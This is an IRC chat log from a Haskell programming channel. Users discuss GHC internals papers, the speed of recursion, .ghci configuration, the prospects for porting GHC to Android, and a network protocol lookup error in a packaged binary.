23:19:41 <shachaf> I don't know what a good short introduction is but the STG paper is good.
23:19:43 <shachaf> @where stg
23:19:43 <lambdabot> http://citeseer.ist.psu.edu/viewdoc/summary?doi=10.1.1.53.3729
23:19:51 <shachaf> @where dyn-ptr is probably also relevant.
23:19:51 <lambdabot> I know nothing about dyn-ptr.
23:19:52 <Breadmonster> shachaf: So no performance penalty?
23:19:58 <shachaf> @where dynptr is probably also relevant.
23:19:58 <lambdabot> I know nothing about dynptr.
23:20:09 <shachaf> @where ptr-tag is probably also relevant.
23:20:09 <lambdabot> http://research.microsoft.com/~simonpj/papers/ptr-tag/index.htm
23:20:17 <shachaf> Breadmonster: To what?
23:20:39 <Breadmonster> shachaf: To use recursion?
23:21:06 <Breadmonster> I've noticed that GHC recursion is considerably faster than Python or Ruby.
23:21:34 <Breadmonster> It better be, because that's the only looping construct in the language, but that's not the matter.
23:21:48 <shachaf> A penalty compared to what?
23:22:49 <simpson> Breadmonster: Python and Ruby (at least in their stackful C incarnations) allocate stack frames on call.
23:23:01 <simpson> So of course they're going to be slower than languages without those frames.
23:23:40 <simpson> Also comparing speed with CPython or irb isn't gonna be useful, because types.
23:24:29 <Breadmonster> True.
23:28:13 <otters> is it possible to check if a module exists in .ghci?
23:30:54 <otters> because I use cabal-ghci which changes the sandbox to the current project if one exists
23:31:43 <otters> and I have a bunch of convenience declarations from simple-reflect (let a = var "a" and so forth)
23:31:55 <otters> but if simple-reflect isn't in scope I get a bunch of errors when I'm launching ghci
23:32:19 <shachaf> Note that you can make a .ghci in a local directory.
23:34:04 <otters> but in that case ./.ghci and ~/.ghci are both loaded, aren't they?
23:34:36 <otters> yes
23:50:11 <lpvb> if GHC 7.8 includes iOS compilation support, then does it include android as well?
23:50:18 <lpvb> reference: https://twitter.com/lukexi/status/332063557099343872
23:51:06 <shachaf> lpvb: No, unless someone did it without telling me.
23:51:23 <lpvb> aren't they both ARM platforms?
23:51:30 <shachaf> They are both ARM platforms.
23:51:34 <lpvb> or is the premise of GHC for iOS wrong
23:51:50 <carter> thoughtpolice intersting question on the dev list
23:52:18 <carter> lpvb android doesnt act quite like an OS in the same way
23:52:26 <carter> it is linuxed based
23:52:37 <carter> and has more permissive code execution model than ios
23:53:20 <carter> but ‚Ä¶ its also another unique OS
23:53:27 <carter> and someone has to put the time into targetting it
23:53:42 <shachaf> Someone did it once.
23:53:43 <lpvb> it should be easy if the iOS target is done right?
23:53:52 <shachaf> But that code was never released to the public (or used).
23:54:09 <shachaf> lpvb: Why?
23:54:13 <shachaf> It is still a port.
23:54:14 <carter> http://stackoverflow.com/questions/5151858/running-a-haskell-program-on-the-android-os
23:54:31 <lpvb> well much easier than the work it took to target iOS
23:55:06 <carter> lpvb then do it for us :)
23:55:08 <carter> please
23:55:11 <carter> that'd be really cool
23:55:30 <blackdog> hrm. this is confusing - my program is giving me "getProtocolByName: does not exist (no such protocol name: tcp)"
23:55:44 <lpvb> I don't think I'm on that level yet
23:55:55 <carter> blackdog yo!
23:55:56 * hackagebot hyakko 0.6.2 - Literate-style Documentation Generator  http://hackage.haskell.org/package/hyakko-0.6.2 (JeremyHull)
23:56:07 <blackdog> if i compile a small test program it works fine, though. how very odd.
23:56:08 <carter> lpvb the only way to level up is by levelling up
23:56:13 <blackdog> carter: what up, playa? :)
23:56:25 <carter> patchin
23:56:29 <carter> every day i be patchin
23:56:53 <carter> by volume, the haskell code i've written is more patches than my own stuff
23:57:28 <carter> lpvb if android dev via haskell is something you wan
23:57:31 <carter> figure out how to make it happen
23:57:40 <carter> learn and do
23:57:45 <carter> its the best way to learn!
23:57:49 <lpvb> carter: sounds like you want it to
23:57:56 <carter> lpvb nope, i'm too busy :)
23:57:57 <lpvb> and low level stuff is not really my interest
23:58:16 <lpvb> hence my use of haskell
23:58:21 <carter> lpvb everything is lowl level when you're an idea guy :)
23:58:31 <carter> its not about low level vs high level
23:58:40 <carter> its about focusing on the  problem you wanna solve
23:58:42 <carter> and solving it
23:58:59 <carter> if you want to do functional programming targetting android
23:59:11 <carter> either use F# via xamarin studio
23:59:15 <carter> find out if theres an ocaml port
23:59:18 <blackdog> heh. ah, i think it's my packaging - must be not linking it somehow? copying the raw binary across seems to work fine
23:59:21 <lpvb> it'd be easier just to use scala
23:59:21 <carter> or learn enough to write a ghc port :)
23:59:27 <carter> or that
23:59:30 <carter> blackdog eh?
23:59:32 <carter> ohhh
23:59:42 <carter> i think theres some c lib rts linking you need to do
